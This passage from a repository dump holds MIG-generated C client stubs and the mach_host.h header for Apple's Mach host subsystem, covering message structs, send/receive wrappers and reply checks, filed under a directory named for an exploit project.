		uint32_t multiuser_flags;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_get_multiuser_config_flags_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_get_multiuser_config_flags_t__defined */

	__DeclareSendRpc(229, "host_get_multiuser_config_flags")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 229;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(229, "host_get_multiuser_config_flags")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(229, "host_get_multiuser_config_flags")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_get_multiuser_config_flags_t__defined)
	check_result = __MIG_check__Reply__host_get_multiuser_config_flags_t((__Reply__host_get_multiuser_config_flags_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_get_multiuser_config_flags_t__defined) */

	*multiuser_flags = Out0P->multiuser_flags;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_check_multiuser_mode_t__defined)
#define __MIG_check__Reply__host_check_multiuser_mode_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_check_multiuser_mode_t(__Reply__host_check_multiuser_mode_t *Out0P)
{

	typedef __Reply__host_check_multiuser_mode_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 330) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_check_multiuser_mode_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_check_multiuser_mode */
mig_external kern_return_t host_check_multiuser_mode
(
	host_t host,
	uint32_t *multiuser_mode
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t multiuser_mode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t multiuser_mode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_check_multiuser_mode_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_check_multiuser_mode_t__defined */

	__DeclareSendRpc(230, "host_check_multiuser_mode")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 230;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(230, "host_check_multiuser_mode")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(230, "host_check_multiuser_mode")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_check_multiuser_mode_t__defined)
	check_result = __MIG_check__Reply__host_check_multiuser_mode_t((__Reply__host_check_multiuser_mode_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_check_multiuser_mode_t__defined) */

	*multiuser_mode = Out0P->multiuser_mode;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__mach_zone_info_for_zone_t__defined)
#define __MIG_check__Reply__mach_zone_info_for_zone_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_zone_info_for_zone_t(__Reply__mach_zone_info_for_zone_t *Out0P)
{

	typedef __Reply__mach_zone_info_for_zone_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 331) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__mach_zone_info_for_zone_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_zone_info_for_zone */
mig_external kern_return_t mach_zone_info_for_zone
(
	host_priv_t host,
	mach_zone_name_t name,
	mach_zone_info_t *info
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_zone_name_t name;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_zone_info_t info;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_zone_info_t info;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_zone_info_for_zone_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_zone_info_for_zone_t__defined */

	__DeclareSendRpc(231, "mach_zone_info_for_zone")

	InP->NDR = NDR_record;

	InP->name = name;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 231;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(231, "mach_zone_info_for_zone")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(231, "mach_zone_info_for_zone")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_zone_info_for_zone_t__defined)
	check_result = __MIG_check__Reply__mach_zone_info_for_zone_t((__Reply__mach_zone_info_for_zone_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_zone_info_for_zone_t__defined) */

	*info = Out0P->info;

	return KERN_SUCCESS;
}

```

`Exploits/oobPCI/Sources/generated/mach_host.h`:

```h
#ifndef	_mach_host_user_
#define	_mach_host_user_

/* Module mach_host */

#include <string.h>
#include <mach/ndr.h>
#include <mach/boolean.h>
#include <mach/kern_return.h>
#include <mach/notify.h>
#include <mach/mach_types.h>
#include <mach/message.h>
#include <mach/mig_errors.h>
#include <mach/port.h>
	
/* BEGIN VOUCHER CODE */

#ifndef KERNEL
#if defined(__has_include)
#if __has_include(<mach/mig_voucher_support.h>)
#ifndef USING_VOUCHERS
#define USING_VOUCHERS
#endif
#ifndef __VOUCHER_FORWARD_TYPE_DECLS__
#define __VOUCHER_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR
#define __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR __unsafe_indexable
#endif
	extern boolean_t voucher_mach_msg_set(mach_msg_header_t * msg) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif // __VOUCHER_FORWARD_TYPE_DECLS__
#endif // __has_include(<mach/mach_voucher_types.h>)
#endif // __has_include
#endif // !KERNEL
	
/* END VOUCHER CODE */

	
/* BEGIN MIG_STRNCPY_ZEROFILL CODE */

#if defined(__has_include)
#if __has_include(<mach/mig_strncpy_zerofill_support.h>)
#ifndef USING_MIG_STRNCPY_ZEROFILL
#define USING_MIG_STRNCPY_ZEROFILL
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_ATTR
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_COUNTEDBY_ATTR(C) __unsafe_indexable
#endif
	extern int mig_strncpy_zerofill(char * dest, const char * src, int len) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif /* __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__ */
#endif /* __has_include(<mach/mig_strncpy_zerofill_support.h>) */
#endif /* __has_include */
	
/* END MIG_STRNCPY_ZEROFILL CODE */


#ifdef AUTOTEST
#ifndef FUNCTION_PTR_T
#define FUNCTION_PTR_T
typedef void (*function_ptr_t)(mach_port_t, char *, mach_msg_type_number_t);
typedef struct {
        char            * name;
        function_ptr_t  function;
} function_table_entry;
typedef function_table_entry   *function_table_t;
#endif /* FUNCTION_PTR_T */
#endif /* AUTOTEST */

#ifndef	mach_host_MSG_COUNT
#define	mach_host_MSG_COUNT	35
#endif	/* mach_host_MSG_COUNT */

#include <Availability.h>
#include <mach/std_types.h>
#include <mach/mig.h>
#include <mach/mig.h>
#include <mach/mach_types.h>
#include <mach/mach_types.h>
#include <mach_debug/mach_debug_types.h>
#include <mach/mach_init.h>

#ifdef __BeforeMigUserHeader
__BeforeMigUserHeader
#endif /* __BeforeMigUserHeader */

#include <sys/cdefs.h>
__BEGIN_DECLS


/* Routine host_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_info
(
	host_t host,
	host_flavor_t flavor,
	host_info_t host_info_out,
	mach_msg_type_number_t *host_info_outCnt
);

/* Routine host_kernel_version */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_kernel_version
(
	host_t host,
	kernel_version_t kernel_version
);

/* Routine _host_page_size */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t _host_page_size
(
	host_t host,
	vm_size_t *out_page_size
);

/* Routine mach_memory_object_memory_entry */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_memory_object_memory_entry
(
	host_t host,
	boolean_t internal,
	vm_size_t size,
	vm_prot_t permission,
	memory_object_t pager,
	mach_port_t *entry_handle
);

/* Routine host_processor_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_processor_info
(
	host_t host,
	processor_flavor_t flavor,
	natural_t *out_processor_count,
	processor_info_array_t *out_processor_info,
	mach_msg_type_number_t *out_processor_infoCnt
);

/* Routine host_get_io_main */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_get_io_main
(
	host_t host,
	io_main_t *io_main
);

/* Routine host_get_clock_service */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_get_clock_service
(
	host_t host,
	clock_id_t clock_id,
	clock_serv_t *clock_serv
);

/* Routine kmod_get_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t kmod_get_info
(
	host_t host,
	kmod_args_t *modules,
	mach_msg_type_number_t *modulesCnt
);

/* Routine host_virtual_physical_table_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_virtual_physical_table_info
(
	host_t host,
	hash_info_bucket_array_t *info,
	mach_msg_type_number_t *infoCnt
);

/* Routine processor_set_default */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t processor_set_default
(
	host_t host,
	processor_set_name_t *default_set
);

/* Routine processor_set_create */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t processor_set_create
(
	host_t host,
	processor_set_t *new_set,
	processor_set_name_t *new_name
);

/* Routine mach_memory_object_memory_entry_64 */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_memory_object_memory_entry_64
(
	host_t host,
	boolean_t internal,
	memory_object_size_t size,
	vm_prot_t permission,
	memory_object_t pager,
	mach_port_t *entry_handle
);

/* Routine host_statistics */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_statistics
(
	host_t host_priv,
	host_flavor_t flavor,
	host_info_t host_info_out,
	mach_msg_type_number_t *host_info_outCnt
);

/* Routine host_request_notification */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_request_notification
(
	host_t host,
	host_flavor_t notify_type,
	mach_port_t notify_port
);

/* Routine host_lockgroup_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_lockgroup_info
(
	host_t host,
	lockgroup_info_array_t *lockgroup_info,
	mach_msg_type_number_t *lockgroup_infoCnt
);

/* Routine host_statistics64 */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_statistics64
(
	host_t host_priv,
	host_flavor_t flavor,
	host_info64_t host_info64_out,
	mach_msg_type_number_t *host_info64_outCnt
);

/* Routine mach_zone_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_zone_info
(
	host_priv_t host,
	mach_zone_name_array_t *names,
	mach_msg_type_number_t *namesCnt,
	mach_zone_info_array_t *info,
	mach_msg_type_number_t *infoCnt
);

/* Routine host_create_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_create_mach_voucher
(
	host_t host,
	mach_voucher_attr_raw_recipe_array_t recipes,
	mach_msg_type_number_t recipesCnt,
	ipc_voucher_t *voucher
);

/* Routine host_register_mach_voucher_attr_manager */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_register_mach_voucher_attr_manager
(
	host_t host,
	mach_voucher_attr_manager_t attr_manager,
	mach_voucher_attr_value_handle_t default_value,
	mach_voucher_attr_key_t *new_key,
	ipc_voucher_attr_control_t *new_attr_control
);

/* Routine host_register_well_known_mach_voucher_attr_manager */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_register_well_known_mach_voucher_attr_manager
(
	host_t host,
	mach_voucher_attr_manager_t attr_manager,
	mach_voucher_attr_value_handle_t default_value,
	mach_voucher_attr_key_t key,
	ipc_voucher_attr_control_t *new_attr_control
);

/* Routine host_set_atm_diagnostic_flag */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_set_atm_diagnostic_flag
(
	host_t host,
	uint32_t diagnostic_flag
);

/* Routine host_get_atm_diagnostic_flag */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_get_atm_diagnostic_flag
(
	host_t host,
	uint32_t *diagnostic_flag
);

/* Routine mach_memory_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_memory_info
(
	host_priv_t host,
	mach_zone_name_array_t *names,
	mach_msg_type_number_t *namesCnt,
	mach_zone_info_array_t *info,
	mach_msg_type_number_t *infoCnt,
	mach_memory_info_array_t *memory_info,
	mach_msg_type_number_t *memory_infoCnt
);

/* Routine host_set_multiuser_config_flags */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_set_multiuser_config_flags
(
	host_priv_t host_priv,
	uint32_t multiuser_flags
);

/* Routine host_get_multiuser_config_flags */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_get_multiuser_config_flags
(
	host_t host,
	uint32_t *multiuser_flags
);

/* Routine host_check_multiuser_mode */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t host_check_multiuser_mode
(
	host_t host,
	uint32_t *multiuser_mode
);

/* Routine mach_zone_info_for_zone */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_zone_info_for_zone
(
	host_priv_t host,
	mach_zone_name_t name,
	mach_zone_info_t *info
);

__END_DECLS

/********************** Caution **************************/
/* The following data types should be used to calculate  */
/* maximum message sizes only. The actual message may be */
/* smaller, and the position of the arguments within the */
/* message layout may vary from what is presented here.  */
/* For example, if any of the arguments are variable-    */
/* sized, and less than the maximum is sent, the data    */
/* will be packed tight in the actual message to reduce  */
/* the presence of holes.                                */
/********************** Caution **************************/

/* typedefs for all requests */

#ifndef __Request__mach_host_subsystem__defined
#define __Request__mach_host_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		host_flavor_t flavor;
		mach_msg_type_number_t host_info_outCnt;
	} __Request__host_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_kernel_version_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request___host_page_size_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		boolean_t internal;
		vm_size_t size;
		vm_prot_t permission;
	} __Request__mach_memory_object_memory_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		processor_flavor_t flavor;
	} __Request__host_processor_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_get_io_main_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		clock_id_t clock_id;
	} __Request__host_get_clock_service_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__kmod_get_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_virtual_physical_table_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__processor_set_default_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__processor_set_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		boolean_t internal;
		memory_object_size_t size;
		vm_prot_t permission;
	} __Request__mach_memory_object_memory_entry_64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		host_flavor_t flavor;
		mach_msg_type_number_t host_info_outCnt;
	} __Request__host_statistics_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notify_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		host_flavor_t notify_type;
	} __Request__host_request_notification_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_lockgroup_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		host_flavor_t flavor;
		mach_msg_type_number_t host_info64_outCnt;
	} __Request__host_statistics64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__mach_zone_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t recipesCnt;
		uint8_t recipes[5120];
	} __Request__host_create_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t attr_manager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_value_handle_t default_value;
	} __Request__host_register_mach_voucher_attr_manager_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t attr_manager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_value_handle_t default_value;
		mach_voucher_attr_key_t key;
	} __Request__host_register_well_known_mach_voucher_attr_manager_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t diagnostic_flag;
	} __Request__host_set_atm_diagnostic_flag_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_get_atm_diagnostic_flag_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__mach_memory_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t multiuser_flags;
	} __Request__host_set_multiuser_config_flags_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_get_multiuser_config_flags_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__host_check_multiuser_mode_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_zone_name_t name;
	} __Request__mach_zone_info_for_zone_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Request__mach_host_subsystem__defined */

/* union of all requests */

#ifndef __RequestUnion__mach_host_subsystem__defined
#define __RequestUnion__mach_host_subsystem__defined
union __RequestUnion__mach_host_subsystem {
	__Request__host_info_t Request_host_info;
	__Request__host_kernel_version_t Request_host_kernel_version;
	__Request___host_page_size_t Request__host_page_size;
	__Request__mach_memory_object_memory_entry_t Request_mach_memory_object_memory_entry;
